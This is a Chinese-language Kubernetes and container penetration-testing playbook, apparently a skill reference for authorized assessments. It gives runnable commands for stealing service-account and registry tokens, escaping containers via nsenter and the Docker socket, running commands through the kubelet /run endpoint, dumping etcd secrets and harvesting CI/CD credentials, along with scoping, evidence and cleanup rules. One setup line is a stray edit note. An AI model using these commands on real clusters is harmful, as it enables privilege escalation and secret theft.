# K8s 与容器（k8s-and-container）

> 配套 `ad-cloud/SKILL.md`、`references/cloud-native.md`。只操作授权集群/命名空间/镜像。
> 占位符：`<kubeconfig>`、`<ns>`、`<sa>`、`<pod>`、`<image>`、`<node>`。先记录 `kubectl config current-context` 与 token 过期时间。

## 0. 本地材料先离线看

```bash
# 不联网的 kubeconfig 体检（本仓库脚本）
python `adcloud-check`（S4 已删：壳，真身在同名包 scripts/ 下） --kubeconfig <kubeconfig>
```

关注：`current-context` 是否正确、`insecure-skip-tls-verify`、无凭据用户、`system:serviceaccount:*:cluster-admin`、JWT `exp`/`groups`、`exec` 插件。
离线只能看“配置面”，RBAC 是否真的宽必须在线验证；不要把文件名/用户名当结论。

## 1. 身份与 RBAC 枚举

```bash
export KUBECONFIG=<kubeconfig>
kubectl config current-context
kubectl config view --minify -o jsonpath='{.users[0].name}{"\n"}'
kubectl auth whoami 2>/dev/null || kubectl auth can-i --list
kubectl auth can-i --list
kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa>
```

```bash
kubectl get clusterrolebinding -o wide
kubectl get rolebinding -A -o wide
kubectl get clusterrole -o json | jq '.items[] | select(.rules[]?.verbs[]?=="*") | .metadata.name'
kubectl get role -A -o json | jq '.items[] | select(.rules[]?.verbs[]?=="*") | .metadata.name'
```

重点权限（任一成立都继续验证）：

| 权限 | 可能路径 |
|---|---|
| `create pods` / `create daemonsets` / `create jobs` | 挂 `hostPath`、privileged、hostPID，落到节点 |
| `get secrets` / `list secrets` | 取 SA token、镜像仓库凭据、云密钥 |
| `patch`/`update` deployments/statefulsets | 改现有工作负载加挂载/换镜像 |
| `impersonate` | 变成高权用户/组/SA |
| `bind` / `escalate` | 把高权 Role/ClusterRole 绑到自己 |
| `get nodes` / `create pods/exec` | 节点信息、进入现有 Pod |

判据：`kubectl auth can-i <verb> <resource>` 返回 `yes`，并实际完成一个只读/低影响动作（如读取测试 Secret、创建带标记的 Pod）。
失败判据：只有 `list` 但 `get` 被拒；或 `can-i` 为 yes 但 Admission/PSP/Quota 拦住。

## 2. Token 与身份滥用

### 2.1 SA token 来源

```bash
# Pod 内
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
# 集群内旧式 Secret
kubectl get secrets -A | grep -E 'service-account-token|dockerconfigjson'
kubectl get secret <name> -n <ns> -o jsonpath='{.data.token}' | base64 -d
```

```bash
# 不落盘解析 JWT（只读 payload）
python - <<'PY'
import base64,json,sys
t=open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
p=t.split('.')[1]; p+='='*(-len(p)%4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))
PY
```

记录 `sub`、`groups`、`exp`、`aud`、`iss`。`system:masters` 绕过 RBAC；`system:serviceaccounts` 覆盖全部 SA。

### 2.2 用 token 直接访问 API

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/<ns>/pods"
```

判据：API 返回 200 且列出授权内资源；403 = token 有效但权限不足；401 = token 过期/无效。不在命令行历史/报告留完整 token。

### 2.3 高价值 token 目标

- `kube-system` 的 controller/CNI/Ingress SA：可能读全集群 Secret 或改 DaemonSet；CI/CD runner 的 SA 常能建 Pod、读 registry secret。
- `cluster-admin`/`system:masters` 绑定：直接提权，但仍要留“前后 can-i”证据；云 IRSA/Workload Identity 走 `cloud-native.md` 的 STS 判据。


## 3. 容器逃逸面

先确认当前 Pod 的 securityContext 与挂载：

```bash
id; capsh --print 2>/dev/null
cat /proc/1/cgroup; cat /proc/self/status | grep -E 'CapEff|Seccomp'
mount | grep -E 'hostPath|/host|docker.sock|containerd.sock|kubelet'
ls -l /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null
```

### 3.1 privileged / CAP_SYS_ADMIN

```bash
# 只读优先：挂宿主根到 /mnt/host
mkdir -p /mnt/host
mount --bind / /mnt/host 2>/dev/null || mount -t proc proc /mnt/host/proc
ls /mnt/host; cat /mnt/host/etc/hostname
# 进入宿主命名空间
nsenter -t 1 -m -u -i -n -p -- id
```

判据：`id` 返回宿主身份，或能读宿主 `/etc/shadow`/kubelet 凭据。失败判据：`Operation not permitted`（缺 CAP_SYS_ADMIN）、宿主 PID namespace 不可见。

### 3.2 hostPath / hostPID / hostNetwork

```bash
# hostPath 常见落点
ls -la /var/lib/kubelet/pods 2>/dev/null
find / -maxdepth 3 -name 'kubelet.conf' -o -name 'admin.conf' 2>/dev/null
# hostPID
ps aux | head; nsenter -t 1 -m -u -i -n -p -- cat /etc/shadow
```

判据：通过挂载点读到宿主文件/配置，或进入宿主命名空间。失败判据：挂载只读且无敏感路径、PID 1 仍是容器 init。

### 3.3 Docker/containerd socket

```bash
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host --privileged alpine chroot /host sh
ctr -a /run/containerd/containerd.sock -n k8s.io containers list
```

判据：能创建特权容器并读到宿主根。失败判据：socket 不存在/权限拒绝、只读 socket 代理。

### 3.4 其他

- cgroup v1 `release_agent`（需 `CAP_SYS_ADMIN` 且 cgroup 未只读）；`CAP_SYS_PTRACE` 注入宿主进程；`CAP_NET_ADMIN` 流量劫持。
- 内核漏洞按版本匹配，只在授权/隔离环境验证；`hostNetwork` 只看得到节点网络，不等于宿主文件系统。

判据统一：**在宿主命名空间执行 `id`，或读到宿主文件系统/凭据，且有完整复现命令**；“Pod 是 privileged”配置本身不算逃逸成功。

### 3.5 逃逸原语四列判据（容器内命令 → 宿主可见证据 → 失败 → 代价）

> 四列全过才写 `confirmed`：① 原语在容器内可机检为真；② 宿主侧有**独立**证据（节点
> hostname/节点文件哈希/节点审计），不是容器自述；③ 复现命令与清理步骤完整。
> 缺 ② 最高只能写 `candidate`（配置面）。

| 原语 | 容器内可机检命令 | 宿主可见证据（独立于容器） | 失败判据 | 代价/噪音 |
| :-- | :-- | :-- | :-- | :-- |
| privileged（全 capability + 设备） | `capsh --print`；`grep CapEff /proc/self/status`；`ls /dev/sd* /dev/nvme*`；`ip link add t0 type dummy` | `nsenter -t 1 -m -u -i -n -p -- hostname` 返回**节点名**（≠容器 hostname）；节点 `/etc/hostname`、`/etc/kubernetes/kubelet.conf` 可读；节点 auditd 出现容器 PID 的 mount/nsenter | `Operation not permitted`、CapEff 缺位、只读挂载、宿主 PID 不可见 | 中高：需创建/改工作负载；节点级动作进 Falco/auditd，可能影响同节点 Pod |
| hostPath（`/`、`/var/lib/kubelet`、`/etc/kubernetes`、`/var/run`） | `findmnt -T /host`；`grep -E 'hostPath\|/var/lib/kubelet' /proc/1/mountinfo`；`ls /host/etc/kubernetes` | 读到 `kubelet.conf`/`admin.conf`/`pki/*` 属节点；同名文件 `sha256sum` 与容器内不同；节点侧文件 mtime/审计 | 只读且无敏感路径、挂载点是 emptyDir、被 PSA `restricted` 拒 | 低噪音，但可能读到生产密钥；写回宿主须单独授权 |
| docker.sock / containerd.sock | `test -w /var/run/docker.sock`；`curl -s --unix-socket /var/run/docker.sock http://localhost/version`；`ctr -a /run/containerd/containerd.sock ns ls` | 新建容器内 `cat /host/etc/hostname` 得节点名；`docker ps` 看到**其他**业务容器；节点 `docker events`/containerd 日志 | socket 不存在/只读代理、SELinux 拦、docker 组无写权 | 中高：会建容器/镜像层，必须删除；`--privileged` 容器可能影响宿主 |
| CAP_SYS_ADMIN（非 privileged） | `capsh --print \| grep sys_admin`；`mount -t tmpfs none /tmp/t` 成功；`unshare -Urm` | 节点 `/proc/mounts` 出现容器发起的挂载；`/proc/*/ns/*` inode 与节点不同 | 缺 cap、禁 user namespace、seccomp 拦 `mount` | 中：错误挂载会污染宿主挂载表 |
| cgroup v1 `release_agent` | `stat -fc %T /sys/fs/cgroup/` = `tmpfs`（v1）；`ls /sys/fs/cgroup/*/release_agent`；写 `notify_on_release` | 宿主执行结果写到容器可见路径（`id`/`hostname` 为节点值）；节点 cgroup 目录新增、`release_agent` 被改写 | cgroup v2（`cgroup2fs`）、`release_agent` 只读、无 CAP_SYS_ADMIN | 高：在宿主执行任意命令；必须登记 `release_agent` 回滚 |
| runc CVE-2019-5736 | `runc --version`、`docker version` Server 段 < 1.0.0-rc6；`ls -l /proc/self/exe` | 下次 `docker exec/run` 时节点执行 payload；节点 runc 二进制哈希变化 | runc 已升级、只读 rootfs、无 `docker exec` 入口 | 极高：覆写宿主 runc，可能使节点不可用；只在隔离环境验证 |
| runc CVE-2024-21626（Leaky Vessels） | `runc --version` ≤ 1.1.11；镜像 `WORKDIR /proc/self/fd/N`；`ls /proc/self/fd` 有指向宿主的 fd | `cat /proc/self/fd/N/etc/hostname` 得节点名；节点侧异常 cwd/构建日志 | runc 已修、WORKDIR 被覆盖、fd 不可用 | 中高：需可控镜像/构建面；可能影响构建节点 |
| cgroup v2 变体（CVE-2022-0492 等） | v2 下无 `release_agent`；查 `CAP_SYS_ADMIN` + `cgroup.subtree_control` 可写 | 同 release_agent：宿主执行痕迹或文件改动 | v2 且无 cap、cgroupfs 只读 | 高；多数结论是 `blocked`，只登记版本与 cap |

**误报杀手**：只读得 `/proc/1/root` 里的**容器**文件系统（PID 1 仍是容器 init）不等于宿主；
`hostNetwork` 只共享网络命名空间；`privileged: true` 只是配置。三者都不能单独写“已逃逸”。

## 4. 集群控制面五面（SA token / RBAC / kubelet / etcd / admission）

> 顺序：离线 kubeconfig → 在线身份 → can-i 矩阵 → kubelet/etcd/admission。
> 每面先只读；建 Pod、改绑定、写 etcd 属写操作，须单独授权并登记回滚。

### 4.1 SA token 挂载与投影

```bash
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
test -f /var/run/secrets/kubernetes.io/serviceaccount/token && echo mounted
# 只读解码 payload，不落盘
python - <<'PY'
import base64,json
p=open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip().split('.')[1]
p+='='*(-len(p)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))
PY
```

| 检查 | 命令 | 通过判据 | 失败判据 |
| :-- | :-- | :-- | :-- |
| 挂载方式 | 上面 `ls`/`test`；`grep -A3 serviceAccountToken /proc/1/mountinfo` | 有 projected/legacy 挂载，路径可读 | 未挂载（`automountServiceAccountToken: false`）→ 换 Secret/CI 面 |
| 受众 `aud` | 解码 payload | `aud` 含 API server（如 `https://kubernetes.default.svc`） | 只含 Vault/OIDC 受众 → 打不了 API server |
| 有效期 `exp` | 解码 payload + `date -u` | 剩余 >10 分钟 | 已过期/时钟偏移 → 重取，不拿死 token 当证据 |
| 主体/组 | 解码 `sub`/`groups` | `sub=system:serviceaccount:<ns>:<sa>`，组与绑定对得上 | `sub` 与目标命名空间不符、组是伪造字符串（JWT 不验签） |
| 真实权限 | `curl -sk -X POST $API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -d '{...}'`；`kubectl auth can-i --list` | 返回 `resourceRules`/`nonResourceRules` 非空；`can-i` 有 `yes` | 401（token 无效）/403（无权限）/全 `no` |

判据：`aud` 匹配 + `exp` 未过 + rules review 有实权 + 一次真实只读读取成功。
仅凭 `sub` 里出现 `cluster-admin` 只是命名线索，见 `03-model-pitfalls.md`。

### 4.2 RBAC can-i 矩阵（逐条可机检，不靠猜）

| verb / resource | `kubectl auth can-i <verb> <res>` | 成立后可走 | 失败判据 | 代价 |
| :-- | :-- | :-- | :-- | :-- |
| `create pods` | `can-i create pods -n <ns>` | 建带标记 Pod（hostPath/hostPID）→ 落节点 | PSA `restricted`/Quota/Admission 拒 | 中：留 Pod 需清理 |
| `create daemonsets`/`jobs` | 同名 can-i | 全节点覆盖（DaemonSet）或一次性任务 | 控制器被禁用、节点 selector 不匹配 | 高：影响所有节点 |
| `get`/`list secrets` | `can-i get secrets -n <ns>` | 取 SA token/镜像凭据/云密钥 | 只 `list` 不 `get`、Secret 空/过期 | 低；但可能触达生产密钥 |
| `create pods/exec` | `can-i create pods/exec` | 进现有高权 Pod 取 token | 目标 Pod 无 shell、RBAC 只在单 Pod | 低中；进生产 Pod 须授权 |
| `pods/ephemeralcontainers` | `can-i create pods/ephemeralcontainers` | 注入 debug 容器（可 privileged）→ 节点 | admission 禁 ephemeral、PSA 拦 | 中高：等同改工作负载 |
| `impersonate` users/groups/SAs | `can-i impersonate serviceaccounts` | 直接以高权主体调用 API | 目标不存在、audience 不匹配 | 低（只读可验证） |
| `bind`/`escalate` | `can-i bind clusterroles`、`can-i escalate clusterroles` | 把高权角色绑到自身/扩权 | `auth reconcile` 被拒、绑定后仍 `no` | 高：必须撤销绑定 |
| `nodes/proxy` | `can-i create nodes/proxy` | 经 API server 走 kubelet `/run` → Pod RCE | 节点地址校验（CVE-2022-3294 已修）/网络策略 | 高：等同节点级执行 |
| `patch`/`update` deployments | `can-i patch deployments` | 改现有工作负载加挂载/换镜像 | 镜像拉取失败、滚动更新中断业务 | 高：影响在线业务 |
| `create clusterrolebindings` | 同名 can-i | 自绑 `cluster-admin` | admission 限制、集群已收敛 | 高：全集群权限，须回滚 |

判据：can-i 返回 `yes` **且** 完成一次只读/低影响动作（读测试 Secret、建标记 Pod 后删）；
`yes` 但被 PSA/Quota/Admission 拦住 = `blocked`，记录拒绝原文。

### 4.3 kubelet 10250 / 10255

```bash
# 10255 只读：仅信息面，无 exec/run
curl -s http://<node>:10255/pods | head
curl -s http://<node>:10255/metrics | head
# 10250：/run 直接回显；/exec 是 SPDY/WebSocket 流（裸 POST 只得 302）
curl -sk -X POST https://<node>:10250/run/<ns>/<pod>/<ctr> -d 'cmd=id' \
  -H "Authorization: Bearer $TOKEN"
curl -sk -i -X POST 'https://<node>:10250/exec/<ns>/<pod>/<ctr>?command=id&input=1&output=1&tty=0' \
  -H "Authorization: Bearer $TOKEN" | head -5
# 经 API server 走 nodes/proxy（10250 被防火墙挡住时的主路径）
curl -sk -X POST "$API/api/v1/nodes/<node>/proxy/run/<ns>/<pod>/<ctr>" \
  -H "Authorization: Bearer $TOKEN" -d 'cmd=id'
```

判据：`/run` 返回字面 `id`/`hostname` 输出，或 `/exec` 走完流拿到输出。
失败判据：10255 有数据 ≠ 可执行；`/exec` 裸 POST 的 302 不是“已修补”也不是“已执行”；
`nodes/proxy` 全 `no` 或 403 → 该面 blocked。

### 4.4 etcd 2379

```bash
curl -s http://<etcd>:2379/version
curl -s http://<etcd>:2379/health
# v3 range（key 为 base64；"L3JlZ2lzdHJ5L3NlY3JldHM=" = /registry/secrets）
curl -s http://<etcd>:2379/v3/kv/range -H 'Content-Type: application/json' \
  -d '{"key":"L3JlZ2lzdHJ5L3NlY3JldHM=","range_end":"L3JlZ2lzdHJ5L3NlY3JldHQ=","limit":5}'
```

判据：`range` 返回 `kvs` 且有 key/value 数据；有 `EncryptionConfiguration` 时 value 为密文。
失败判据：只回 `version`/`health`（暴露面，`candidate`）；400/401/TLS 握手失败、
只连上 2380 peer 端口 → 不是未授权客户端访问；有数据但全密文 → 不得写“明文密钥”。
代价：读快照等同导出全集群 Secret，须授权 + 加密保存；不得写 key/删 key。

### 4.5 admission webhook 与 PSA 绕过面

```bash
kubectl get validatingwebhookconfigurations,mutatingwebhookconfigurations \
  -o json | jq '.items[] | {name:.metadata.name, hooks:[.webhooks[]? |
    {name:.name, failurePolicy:.failurePolicy, ns:.namespaceSelector,
     obj:.objectSelector, rules:.rules}]}'
kubectl get ns --show-labels | grep -E 'pod-security.kubernetes.io'
```

| 观察 | 含义 | 只读判据 | 失败判据 |
| :-- | :-- | :-- | :-- |
| `failurePolicy: Ignore` | webhook 不可用时放行 | 记录 webhook 与 rules 覆盖范围 | webhook 服务健康，无绕过收益 |
| `namespaceSelector` 排除某些 ns | 该 ns 不受策略约束 | 目标 ns 的 labels 与 selector 不匹配 | selector 覆盖全部 ns（`matchExpressions` 为空/`*`） |
| `objectSelector` 只匹配部分对象 | 换 label 即绕过 | 目标对象 label 不在 selector 内 | selector 为空=全匹配 |
| `kube-system`/`kube-public` 常被排除 | 可落 Pod 到系统 ns | 仅只读核 selector；建 Pod 需授权 | 系统 ns 也纳入策略 |
| 静态 Pod 清单路径 `/etc/kubernetes/manifests` | 绕过 API server admission | 需要节点文件写权限（先证 hostPath/逃逸） | 无节点写权限 → `blocked` |
| PSA 标签 `enforce=restricted` | 禁 privileged/hostPath/hostPID | `kubectl get ns <ns> --show-labels` | 标签为 `privileged`/缺省且集群默认 baseline |

判据：selector 确实排除目标 ns/对象，**且**授权后创建成功（否则只到 `candidate`）。
失败判据：`failurePolicy: Fail` + selector 全覆盖 + PSA `restricted` + 无节点写权限 → 此面 blocked，
转 Secret/CI 或应用层，不要反复试创建触发告警。

### 4.6 五面结论上限

| 面 | 最高 `candidate` | 升级 `confirmed` 还缺什么 |
| :-- | :-- | :-- |
| SA token | token 可解码、`aud/exp` 合规 | rules review 有权 + 一次真实资源读取/操作 |
| RBAC | can-i `yes` | 低影响动作成功（读测试 Secret、建后即删的标记 Pod） |
| kubelet | `/pods` 可读、`/run` 可 POST | 字面命令输出；`/exec` 流走通 |
| etcd | `version`/`health` 可读 | `range` 返回真实 key/value，并说明是否密文 |
| admission | selector/failurePolicy 存在绕过位 | 授权后创建成功；静态 Pod 需节点写证据 |

## 5. 镜像与 CI/CD 凭据

### 4.1 镜像层与配置

```bash
trivy image --severity HIGH,CRITICAL <image>
trivy fs --scanners secret .
trivy config .
grype <image>; syft <image> -o json
```

重点：层里残留的 `.git`、`.env`、`~/.aws`、`~/.docker/config.json`、CI token、签名密钥；“版本旧”不等于可利用。
判据：命中可利用的 HIGH/CRITICAL（有入口/利用链）或明文密钥，并能复现读取/使用。

### 4.2 Registry 与拉取凭据

```bash
kubectl get secret -A -o json | jq -r '.items[] | select(.type=="kubernetes.io/dockerconfigjson") | .metadata.namespace+"/"+.metadata.name'
kubectl get secret <name> -n <ns> -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d | jq .
```

判据：用拉取凭据能 `docker login`/拉取授权内镜像；仅看到 Secret 名称不算。

### 4.3 CI/CD 环境

```bash
env | grep -Ei 'AWS|AZURE|GCP|TOKEN|SECRET|CI_|GITHUB|GITLAB|DOCKER'
ls -la ~/.aws ~/.docker ~/.config/gcloud 2>/dev/null
cat ~/.docker/config.json 2>/dev/null
git config --list --show-origin | grep -Ei 'url|token'
```

- `GITHUB_TOKEN`/`CI_JOB_TOKEN` 的 scope：写仓库、读 protected env、触发其他流水线。
- Runner 是否共享、能否被 MR/PR 触发、能否挂宿主 Docker socket；OIDC 信任策略 `sub`/`aud` 是否过宽（`repo:*`、`ref:*`）；签名密钥能否推生产镜像。

判据：用 CI token 成功读取受保护变量、推送镜像、或 AssumeRole 到部署角色，且有 API 返回。
失败判据：token 只读、环境隔离、OIDC `sub` 精确匹配。

## 6. 失败判据与降级

| 现象 | 原因 | 处理 |
|---|---|---|
| `Unauthorized` | token 过期/错误集群 | 重新取 token，核对 `exp`/`iss`/`aud` |
| `Forbidden` | RBAC 不足 | `auth can-i --list`，换 SA/角色，不要盲试 |
| 无法创建 Pod | PSP/PSA/Quota/Admission | 查 namespace 的 PSA 标签与 quota |
| 逃逸失败 | 缺 CAP/只读挂载/seccomp | 换面或停下，不反复提权 |
| Secret 为空 | 旧式 token 已不自动生成 | 用 projected token 或换目标 |
| 镜像扫描无结果 | 私有 registry/架构不匹配 | 先拉取/指定平台，再做 SBOM |

降级顺序：只读 API 枚举 → 现有 Pod `exec` → 创建带标记 Pod → 修改现有工作负载 → 节点级逃逸。每级都要单独授权。

## 7. 证据、清理与边界

- 证据：命令、时间、context/namespace、前后 `auth can-i`、API 返回、Pod 清单、节点 `id`。
- 清理：删测试 Pod/Job/DaemonSet、撤销临时 RoleBinding、删上传工具与 Secret 副本；恢复被改的 Deployment。
- 不导出业务数据、不创建计费资源、不改 IAM/集群策略（除非单独授权并备份）；不把“有权限”写成“已逃逸”、“镜像有 CVE”写成“可提权”。
- 纯 Web/应用漏洞走 R20；AD/Kerberos 部分见 `kerberos-and-adcs.md`。
